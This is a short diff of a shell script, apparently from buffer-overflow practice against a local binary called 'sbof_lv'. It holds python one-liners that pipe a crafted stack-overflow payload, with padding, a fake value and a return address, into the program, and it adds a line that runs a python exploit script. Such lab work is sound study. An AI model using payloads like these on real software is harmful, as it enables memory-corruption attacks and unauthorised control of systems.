@@ -26,3 +26,6 @@ python3 -c "import sys; sys.stdout.buffer.write(b'a' * 0x10 + b'H4cked!'.ljust(0
 echo "-----"
 strings -t x sbof_lv | grep admin
 python3 -c "import sys; from struct import pack; sys.stdout.buffer.write(b'a' * 0x10 + b'H4cked!'.ljust(0x14, b'\x00') + pack('<IQ', 0xdeadbeef, 0x40204b))" | ./sbof_lv
+
+# pythonで書き換え
+stdbuf -o0 -e0 python3 ./sbof_lv.py
